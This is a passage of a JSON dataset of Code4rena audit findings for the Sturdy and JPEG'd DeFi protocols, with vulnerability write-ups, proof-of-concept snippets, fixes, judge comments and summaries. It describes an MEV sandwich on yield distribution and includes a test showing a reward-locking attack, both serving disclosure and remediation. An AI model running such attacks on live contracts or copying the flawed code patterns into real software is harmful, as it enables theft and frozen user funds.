      "summary": "\nThis bug report details an attack that can be used to unfairly divide yield among stablecoin deposits. An attacker can use MEV (via gas auction or Flashbots or control of miners) to provide a large stablecoin deposit just before an admin's call to distributeYield. This allows the attacker to receive a large amount of the yield and then immediately withdraw their deposit. The exact mechanism for how yield is distributed to lenders of a particular stablecoin is in LendingPool.sol, which is out of scope. However, even ignoring this, MEV can still be used to unfairly hurt lenders of other stablecoins.\n\nThe proof of concept provided is as follows: an attacker watches the mempool for calls to distributeYield by the admin, then orders the block's transactions (most easily using a flashbots bundle) in the following order: i. Attacker deposits stablecoins to lend, ii. admin's call to distributeYield happens, iii. Attacker withdraws their deposit. This allows the attacker to make the asset they deposited (and thus themselves) receive much of the yield even though they provide no value to Sturdy since none of their deposit is ever borrowed.\n\nThe recommended mitigation steps to prevent this attack are for the admin to use flashbots or some other means of submitting the distributeYield call that skips the mempool. A better mitigation could use something like snapshotting who has deposited since the last yield distribution and only give these depositers yield based on the size of their deposits the next time yield is distributed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/61",
      "tags": [],
      "finders": [
        "0x52",
        "jonah1005",
        "leastwood",
        "sorrynotsorry",
        "mtz",
        "hyh"
      ]
    },
    {
      "id": "2338",
      "title": "[M-05] Withdrawing ETH collateral with max uint256 amount value reverts transaction",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by WatchPug_\n\nWithdrawing ETH collateral via the `withdrawCollateral` function using `type(uint256).max` for the `_amount` parameter reverts the transaction due to `_asset` being the zero-address and `IERC20Detailed(_asset).decimals()` not working for native ETH.\n\n#### Proof of Concept\n\n[GeneralVault.sol#L121-L124](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L121-L124)\n\n```solidity\nif (_amount == type(uint256).max) {\n    uint256 decimal = IERC20Detailed(_asset).decimals(); // @audit-info does not work for native ETH. Transaction reverts\n    _amount = _amountToWithdraw.mul(this.pricePerShare()).div(10**decimal);\n}\n```\n\n### Recommended mitigation steps\n\nCheck `_asset` and use hard coded decimal value (`18`) for native ETH.\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/85)**\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/85):**\n > [Fix the issue of transaction fails due to calculate ETH's decimals sturdyfi/code4rena-may-2022#7](https://github.com/sturdyfi/code4rena-may-2022/pull/7)\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/85#issuecomment-1145575544):**\n > Good find! Stated in `_asset` description that null address is interpreted as ETH, which isn't a token, and therefore reverts when attempting to fetch its decimals.\n\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on a vulnerability found in the `withdrawCollateral` function of the GeneralVault smart contract. The vulnerability occurs when `type(uint256).max` is used for the `_amount` parameter and `_asset` is the zero-address. This causes the transaction to revert because `IERC20Detailed(_asset).decimals()` does not work for native ETH. Manual review was used to identify this vulnerability. The recommended mitigation step is to check `_asset` and use a hard coded decimal value of 18 for native ETH.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/85",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "WatchPug",
        "berndartmueller"
      ]
    },
    {
      "id": "2337",
      "title": "[M-04] ConvexCurveLPVault's `_transferYield` can become stuck with zero reward transfer",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nNow there are no checks for the amounts to be transferred via \\_transferYield and \\_processTreasury. As reward token list is external and an arbitrary token can end up there, in the case when such token doesn't allow for zero amount transfers, the reward retrieval can become unavailable.\n\nI.e. processYield() can be fully blocked for even an extended period, with some low probability, which cannot be controlled otherwise as pool reward token list is external.\n\nSetting the severity to medium as reward gathering is a base functionality for the system and its availability is affected.\n\n#### Proof of Concept\n\n\\_transferYield proceeds with sending the amounts to treasury and yieldManager without checking:\n\n[ConvexCurveLPVault.sol#L74-L82](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L74-L82)<br>\n\n```solidity\n    // transfer to treasury\n    if (_vaultFee > 0) {\n      uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);\n      yieldAmount = yieldAmount.sub(treasuryAmount);\n    }\n\n    // transfer to yieldManager\n    address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');\n    TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount);\n```\n\n[ConvexCurveLPVault.sol#L205-L209](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L205-L209)<br>\n\n```solidity\n  function _processTreasury(address _asset, uint256 _yieldAmount) internal returns (uint256) {\n    uint256 treasuryAmount = _yieldAmount.percentMul(_vaultFee);\n    IERC20(_asset).safeTransfer(_treasuryAddress, treasuryAmount);\n    return treasuryAmount;\n  }\n```\n\nThe incentive token can be arbitrary. Some ERC20 do not allow zero amounts to be sent:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nIn a situation of such a token added to reward list and zero incentive amount earned the whole processYield call will revert, making reward gathering unavailable until either such token be removed from pool's reward token list or some non-zero reward amount be earned. Both are external processes and aren’t controllable.\n\n### Recommended Mitigation Steps\n\nConsider running the transfers in \\_transferYield only when yieldAmount is positive:\n\n```solidity\n+\tif (yieldAmount > 0) {\n\t    // transfer to treasury\n\t    if (_vaultFee > 0) {\n\t      uint256 treasuryAmount = _processTreasury(_asset, yieldAmount);\n\t      yieldAmount = yieldAmount.sub(treasuryAmount);\n\t    }\n\n\t    // transfer to yieldManager\n\t    address yieldManager = _addressesProvider.getAddress('YIELD_MANAGER');\n\t    TransferHelper.safeTransfer(_asset, yieldManager, yieldAmount);\n+  }\n```\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/79)**\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/79):**\n > [Fix the issue of some ERC20 tokens revert on zero value transfer sturdyfi/code4rena-may-2022#6](https://github.com/sturdyfi/code4rena-may-2022/pull/6)\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/79#issuecomment-1145574421):**\n > Agree with issue, there have been tokens that require the transfer amount to be non-zero. The other enabler is that the reward token list is arbitrary.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ConvexCurveLPVault.sol smart contract. The vulnerability is that there are no checks for the amounts to be transferred via _transferYield and _processTreasury. This means that if a token is added to the reward list that does not allow for zero amount transfers, the reward retrieval can become unavailable. This could result in reward gathering being blocked for an extended period, with some low probability, which cannot be controlled otherwise as pool reward token list is external.\n\nTo prove the vulnerability, the code for _transferYield and _processTreasury is provided, as well as a link to a token that does not allow for zero amount transfers.\n\nThe recommended mitigation step is to consider running the transfers in _transferYield only when yieldAmount is positive. The code for this is also provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/79",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "2336",
      "title": "[M-03] `processYield()` and `distributeYield()` may run out of gas and revert due to long list of extra rewards/yields",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by leastwood and StErMi_\n\nYields will not be able to be distributed to lenders because attempts to do so will revert.\n\n### Proof of Concept\n\nThe `processYield()` function loops overall of the extra rewards and transfers them\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n105       uint256 extraRewardsLength = IConvexBaseRewardPool(baseRewardPool).extraRewardsLength();\n106       for (uint256 i = 0; i < extraRewardsLength; i++) {\n107         address _extraReward = IConvexBaseRewardPool(baseRewardPool).extraRewards(i);\n108         address _rewardToken = IRewards(_extraReward).rewardToken();\n109         _transferYield(_rewardToken);\n110       }\n```\n\n[ConvexCurveLPVault.sol#L105-L110](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L105-L110)<br>\n\nThere is no guarantee that the tokens involved will be efficient in their use of gas, and there are no upper bounds on the number of extra rewards:\n\n```solidity\n    function extraRewardsLength() external view returns (uint256) {\n        return extraRewards.length;\n    }\n\n\n    function addExtraReward(address _reward) external returns(bool){\n        require(msg.sender == rewardManager, \"!authorized\");\n        require(_reward != address(0),\"!reward setting\");\n\n\n        extraRewards.push(_reward);\n        return true;\n    }\n```\n\n[BaseRewardPool.sol#L105-L115](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L105-L115)<br>\n\nEven if not every extra reward token has a balance, an attacker can sprinkle each one with dust, forcing a transfer by this function\n\n`_getAssetYields()` has a similar issue:\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #X\n\n129       AssetYield[] memory assetYields = _getAssetYields(exchangedAmount);\n130       for (uint256 i = 0; i < assetYields.length; i++) {\n131         if (assetYields[i].amount > 0) {\n132           uint256 _amount = _convertToStableCoin(assetYields[i].asset, assetYields[i].amount);\n133           // 3. deposit Yield to pool for suppliers\n134           _depositYield(assetYields[i].asset, _amount);\n135         }\n136       }\n```\n\n[YieldManager.sol#L129-L136](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L129-L136)<br>\n\n### Recommended Mitigation Steps\n\nInclude an offset and length as is done in `YieldManager.distributeYield()`.\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/70)**\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/70):**\n > [Fix the issue of processYield()'s run out of gas due to convex's extra rewards sturdyfi/code4rena-may-2022#4](https://github.com/sturdyfi/code4rena-may-2022/pull/4)\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/70#issuecomment-1145570424):**\n > I've considered this issue. The reason why I chose not to raise it up is because adding reward tokens is restricted on Convex's side. Given the number of integrations they have, it's unlikely that they will add too many tokens or gas-guzzling ones that will cause claims to run OOG.\n> \n> Nevertheless, it is a possibility, albeit an unlikely one, so I'll let the issue stand (also since the sponsor confirmed it).\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the code of a smart contract that could prevent yields from being distributed to lenders. The code in question is located in two files: ConvexCurveLPVault.sol and YieldManager.sol. In the first file, the `processYield()` function loops through all extra rewards and transfers them, but there is no guarantee that the tokens involved will be efficient in their use of gas. Additionally, there is no upper bounds on the number of extra rewards. In the second file, `_getAssetYields()` has a similar issue. An attacker could sprinkle each one with dust, forcing a transfer by this function. The bug was discovered through code inspection.\n\nIn order to mitigate this bug, it is recommended to include an offset and length as is done in `YieldManager.distributeYield()`. This would ensure that the code is efficient in its use of gas and that there is an upper bound on the number of extra rewards.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/70",
      "tags": [],
      "finders": [
        "leastwood  StErMi",
        "IllIllI"
      ]
    },
    {
      "id": "2335",
      "title": "[M-02] `UNISWAP_FEE` is hardcoded which will lead to significant losses compared to optimal routing",
      "impact": "MEDIUM",
      "content": "_Submitted by Picodes, also found by hickuphh3_\n\nIn [`YieldManager`](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L48), `UNISWAP_FEE` is hardcoded, which reduce significantly the possibilities and will lead to non optimal routes. In particular, all swaps using ETH path will use the wrong pool as it will use the ETH / USDC 1% one due to this [line](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/libraries/swap/UniswapAdapter.sol#L50).\n\n### Proof of Concept\n\nFor example for CRV / USDC, the optimal route is currently CRV -> ETH and ETH -> USDC, and the pool ETH / USDC with 1% fees is tiny compared to the ones with 0.3 or 0.1%. Therefore using the current implementation would create a significant loss of revenue.\n\n### Recommended Mitigation Steps\n\nBasic mitigation would be to hardcode in advance the best Uniswap paths in a mapping like it’s done for Curve pools, then pass this path already computed to the swapping library. This would allow for complex route and save gas costs as you would avoid computing them in `swapExactTokensForTokens`.\n\nThen, speaking from experience, as `distributeYield` is `onlyAdmin`, you may want to add the possibility to do the swaps through an efficient aggregator like 1Inch or Paraswap, it will be way more optimal.\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/48)**\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/48):**\n > [Fix the issue of hardcoded UNISWAP_FEE sturdyfi/code4rena-may-2022#12](https://github.com/sturdyfi/code4rena-may-2022/pull/12)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding the hardcoded UNISWAP_FEE in the YieldManager smart contract. This hardcoding results in a significantly reduced number of possibilities and leads to non-optimal routes, such as the ETH/USDC 1% pool, which is much smaller than the 0.3 or 0.1% pools. This causes a significant loss of revenue.\n\nThe recommended mitigation steps are to hardcode the best Uniswap paths in a mapping, pass this path already computed to the swapping library, and add the possibility to do the swaps through an efficient aggregator like 1Inch or Paraswap. This will be more optimal and save on gas costs.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/48",
      "tags": [],
      "finders": [
        "Picodes",
        "hickuphh3"
      ]
    },
    {
      "id": "2334",
      "title": "[M-01] Possible lost msg.value",
      "impact": "MEDIUM",
      "content": "_Submitted by rotcivegaf, also found by AuditsAreUS, berndartmueller, cccz, MaratCerby, dipp, and StErMi_\n\n[GeneralVault.sol#L75-L89](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L75-L89)<br>\n[LidoVault.sol#L79-L104](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L79-L104)<br>\n[ConvexCurveLPVault.sol#L131-L149](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L131-L149)<br>\n\nPossible lost value in `depositCollateral` function call\n\n### Proof of Concept\n\nIn call `depositCollateral` can will send value and the asset can be an ERC20(!= address(0)), if `LidoVault` and `ConvexCurveLPVault` contract receive this call the fouds will lost.<br>\nAlso in **LidoVault, L88**, if send as asset ETH(== address(0)) and send more value than `_amount`(msg.value > \\_amount), the exedent will lost.\n\n### Recommended Mitigation Steps\n\nIn **GeneralVault**, `depositCollateral` function:\n\n*   Check if the `msg.value` is zero when the `_asset` is ERC20(!= address(0))\n*   Check if the `msg.value` is equeal to `_amount` when the `_asset` ETH(== address(0))\n\n```solidity\nfunction depositCollateral(address _asset, uint256 _amount) external payable virtual {\n  if (_asset != address(0)) { // asset = ERC20\n    require(msg.value == 0, <AN ERROR FROM Errors LIBRARY>);\n  } else { // asset = ETH\n    require(msg.value == _amount, <AN ERROR FROM Errors LIBRARY>);\n  }\n\n  // Deposit asset to vault and receive stAsset\n  // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido\n  (address _stAsset, uint256 _stAssetAmount) = _depositToYieldPool(_asset, _amount);\n\n  // Deposit stAsset to lendingPool, then user will get aToken of stAsset\n  ILendingPool(_addressesProvider.getLendingPool()).deposit(\n    _stAsset,\n    _stAssetAmount,\n    msg.sender,\n    0\n  );\n\n  emit DepositCollateral(_asset, msg.sender, _amount);\n}\n```\n\nAlso can remove the `require(msg.value > 0, Errors.VT_COLLATERAL_DEPOSIT_REQUIRE_ETH);` in **LidoVault, L88**\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/62)**\n\n**[atozICT20 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/62):**\n > [Fix the issue of ETH loss sturdyfi/code4rena-may-2022#3](https://github.com/sturdyfi/code4rena-may-2022/pull/3)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract. The code can be found in the provided github link and it is related to the `depositCollateral` function. The impact of this vulnerability is the possible loss of value in the `depositCollateral` function call.\n\nThe proof of concept for this vulnerability is that if an ERC20 asset (not equal to address(0)) is sent in the call, the funds will be lost. Additionally, if ETH (equal to address(0)) is sent and more value than the `_amount` is sent, the excess will be lost.\n\nThe recommended mitigation steps for this vulnerability are to add some checks in the `depositCollateral` function. Specifically, check if the `msg.value` is zero when the `_asset` is ERC20 (not equal to address(0)), and check if the `msg.value` is equal to `_amount` when the `_asset` is ETH (equal to address(0)). Additionally, the `require(msg.value > 0, Errors.VT_COLLATERAL_DEPOSIT_REQUIRE_ETH);` line can be removed from the **LidoVault, L88** code. \n\nIn conclusion, this bug report is about a vulnerability related to the `depositCollateral` function, which can lead to the loss of funds. The recommended mitigation steps are to add checks to the function and to remove a line of code from the **LidoVault, L88** code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/62",
      "tags": [],
      "finders": [
        "StErMi",
        "cccz",
        "MaratCerby",
        "rotcivegaf",
        "berndartmueller",
        "AuditsAreUS",
        "dipp"
      ]
    },
    {
      "id": "2333",
      "title": "[H-02] The check for value transfer success is made after the return statement in `_withdrawFromYieldPool` of `LidoVault`",
      "impact": "HIGH",
      "content": "\nUsers can lose their funds\n\n### Proof of Concept\n\n[LidoVault.sol#L142](https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142)<br>\n\nThe code checks transaction success after returning the transfer value and finishing execution. If the call fails the transaction won't revert since  require(sent, Errors.VT_COLLATERAL_WITHDRAW_INVALID); won't execute.\n\nUsers will have withdrawn without getting their funds back.\n\n### Recommended Mitigation Steps\n\nReturn the function after the success check\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/157)**\n\n**[iris112 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/157):**\n > [Fix the issue of return before require sturdyfi/code4rena-may-2022#9](https://github.com/sturdyfi/code4rena-may-2022/pull/9)\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/157#issuecomment-1145546283):**\n > Issue is rather clear-cut.\n\n\n\n***\n \n",
      "summary": "\nThis bug report is about a vulnerability in a smart contract code on the Ethereum blockchain. The code is located at https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L142. The impact of this vulnerability is that users can lose their funds. The proof of concept is that the code checks the success of a transaction after returning the transfer value and finishing execution. If the call fails, the transaction won't revert, leaving users with no funds. The recommended mitigation step is to return the function after the success check.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/157",
      "tags": [
        "Transfer Result Check",
        "Weird ERC20"
      ],
      "finders": [
        "0x52",
        "0xf15ers",
        "mtz",
        "fatherOfBlocks",
        "berndartmueller",
        "saian",
        "peritoflores",
        "tabish",
        "z3s",
        "p4st13r4",
        "0x4non",
        "IllIllI",
        "simon135",
        "cccz",
        "rotcivegaf",
        "sorrynotsorry",
        "hickuphh3",
        "WatchPug",
        "pedroais",
        "oyc_109",
        "isamjay",
        "0xliumin",
        "sseefried",
        "hake",
        "TerrierLover",
        "StErMi",
        "CertoraInc",
        "MaratCerby",
        "Dravee",
        "dipp",
        "hyh",
        "GimelSec"
      ]
    },
    {
      "id": "2332",
      "title": "[H-01] Hard-coded slippage may freeze user funds during market turbulence",
      "impact": "HIGH",
      "content": "_Submitted by jonah1005, also found by berndartmueller, Picodes, IllIllI, sorrynotsorry, and WatchPug_\n\n[GeneralVault.sol#L125](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/GeneralVault.sol#L125)<br>\nGeneralVault set a hardcoded slippage control of 99%. However, the underlying yield tokens price may go down.<br>\nIf Luna/UST things happen again, users' funds may get locked.<br>\n\n[LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)<br>\nMoreover, the withdrawal of the lidoVault takes a swap from the curve pool. 1 stEth worth 0.98 ETH at the time of writing.<br>\nThe vault can not withdraw at the current market.<br>\n\nGiven that users' funds would be locked in the lidoVault, I consider this a high-risk issue.\n\n### Proof of Concept\n\n[1 stEth  = 0.98 Eth](https://twitter.com/hasufl/status/1524717773959700481/photo/1)\n\n[LidoVault.sol#L130-L137](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/LidoVault.sol#L130-L137)\n\n### Recommended Mitigation Steps\n\nThere are different ways to set the slippage.\n\nThe first one is to let users determine the maximum slippage they're willing to take.\nThe protocol front-end should set the recommended value for them.\n\n```solidity\n  function withdrawCollateral(\n    address _asset,\n    uint256 _amount,\n    address _to,\n    uint256 _minReceiveAmount\n  ) external virtual {\n      // ...\n    require(withdrawAmount >= _minReceiveAmount, Errors.VT_WITHDRAW_AMOUNT_MISMATCH);\n  }\n```\n\nThe second one is have a slippage control parameters that's set by the operator.\n\n```solidity\n    // Exchange stETH -> ETH via Curve\n    uint256 receivedETHAmount = CurveswapAdapter.swapExactTokensForTokens(\n      _addressesProvider,\n      _addressesProvider.getAddress('STETH_ETH_POOL'),\n      LIDO,\n      ETH,\n      yieldStETH,\n      maxSlippage\n    );\n```\n\n```solidity\n    function setMaxSlippage(uint256 _slippage) external onlyOperator {\n        maxSlippage = _slippage;\n\n        //@audit This action usually emit an event.\n        emit SetMaxSlippage(msg.sender, slippage);\n    }\n```\n\nThese are two common ways to deal with this issue. I prefer the first one.<br>\nThe market may corrupt really fast before the operator takes action.<br>\nIt's nothing fun watching the number go down while having no option.<br>\n\n**[sforman2000 (Sturdy) confirmed](https://github.com/code-423n4/2022-05-sturdy-findings/issues/133)**\n\n**[iris112 (Sturdy) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/133):**\n > [Fix the issue of require 99% of withdrawAmount sturdyfi/code4rena-may-2022#11](https://github.com/sturdyfi/code4rena-may-2022/pull/11)\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/133#issuecomment-1147039530):**\n > I realise there are 2 issues discussed here:\n> 1) The high-risk severity relates to `GeneralVault`'s tight 1% slippage. Because it is inherited by vaults, it can cause withdrawals to fail and for user funds to be stuck.\n> 2) However, in the context of the LIDO vault specifically, [#69's](https://github.com/code-423n4/2022-05-sturdy-findings/issues/69) first low-severity issue rightly points out that users can choose to withdraw their funds in stETH, then do conversion to ETH separately afterwards. Hence, funds won't actually be stuck. I would've therefore classified this a medium-severity issue. Nevertheless, it is expected that users will attempt to withdraw to ETH instead of stETH in times of market volatility.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about two lines of code in two different smart contracts. In GeneralVault.sol#L125, a hardcoded slippage control of 99% is set. This means that if the underlying yield tokens price goes down, users' funds may get locked. In LidoVault.sol#L130-L137, the withdrawal of the lidoVault takes a swap from the curve pool. However, the vault can not withdraw at the current market. This is considered a high-risk issue.\n\nTwo recommended mitigation steps have been suggested. The first is to let users determine the maximum slippage they're willing to take, while the protocol front-end should set the recommended value for them. The second is to have a slippage control parameters that's set by the operator. The first option is preferred as the market may corrupt quickly before the operator takes action.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "https://github.com/code-423n4/2022-05-sturdy-findings/issues/133",
      "tags": [
        "Slippage"
      ],
      "finders": [
        "IllIllI",
        "jonah1005",
        "Picodes",
        "sorrynotsorry",
        "WatchPug",
        "berndartmueller"
      ]
    },
    {
      "id": "22294",
      "title": "[M-05] Rewards will be locked if user transfer directly to pool without using deposit function",
      "impact": "MEDIUM",
      "content": "_Submitted by TrungOre_\n\n[LPFarming.sol#L190](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L190)<br>\n\nReward will be locked in the farming, when user execute a direct transfer with lpToken to farm without using deposit.\n\n### Proof of Concept\n\n\"pls add this test to LpFarming.ts to check\"\n\n    it(\"a part of rewards can't be distributed if user execute a direct transfer to farm\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          const attacker = bob;\n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].transfer(attacker.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // attacker direct deposit lp token to the pool \n          await lpTokens[0].connect(attacker).transfer(farming.address, units(100));\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // when pool end, alice can just take 500 jpeg, and 500 jpeg will be locked in the contract forever !!!\n          await mineBlocks(13);\n          console.log(\"reward of alice: \", (await   farming.pendingReward(0, alice.address)).toString());\n          expect(await farming.pendingReward(0, alice.address)).to.equal(BigNumber.from('500'));\n        });\n\nIn the test above, the attacker transfers 100 lpToken to the farm without using deposit function, and alice deposit 100 lpToken. Because the contract uses `pool.lpToken.balanceOf(address(this))` to get the total supply of lpToken in the pool, it will sum up 100 lpToken of attacker and 100 lpToken of alice. This will lead to the situation where Alice will only be able to claim 500 token (at epoch.endBlock), the rest will be locked in the pool forever. Not only with this pool, it also affects the following, a part of the reward will be locked in the pool when the farm end.\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nDeclare a new variable `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1095312206):**\n > Very minor issue, severity should be 0.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1099230941):**\n > Fixed in [jpegd/core#2](https://github.com/jpegd/core/pull/2).\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/19#issuecomment-1109827974):**\n > I'm going to downgrade this to a medium. There is a possibility for lost funds given real world external factors (user stupidity).\n\n\n\n***\n\n",
      "summary": "\nThis bug report relates to a vulnerability in the LPFarming contract, which is part of the JPEG'd project. It affects the way rewards are distributed when a user executes a direct transfer with lpToken to the farm without using the deposit function. This could lead to part of the rewards being locked in the pool when the farm ends. \n\nTo prove the concept, a test was added to the LpFarming.ts file. This test showed that if an attacker transferred 100 lpToken to the farm without using the deposit function, and Alice deposited 100 lpToken, then when the pool ended Alice would only be able to claim 500 token, with the rest being locked in the pool forever.\n\nThe recommended mitigation step for this issue is to declare a new variable called `totalLPSupply` to the struct `PoolInfo`, and use it instead of `pool.lpToken.balanceOf(address(this))`. \n\nThe issue was confirmed by spaghettieth (JPEG'd), but disagreed with the severity being set as High and commented that it should be 0. The issue was then resolved and fixed in jpegd/core#2, with the severity being decreased to Medium by LSDan (judge). The reason for this was that there is a possibility for lost funds given real world external factors (user stupidity).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "22293",
      "title": "[M-04] `setDebtInterestApr` should accrue debt first",
      "impact": "MEDIUM",
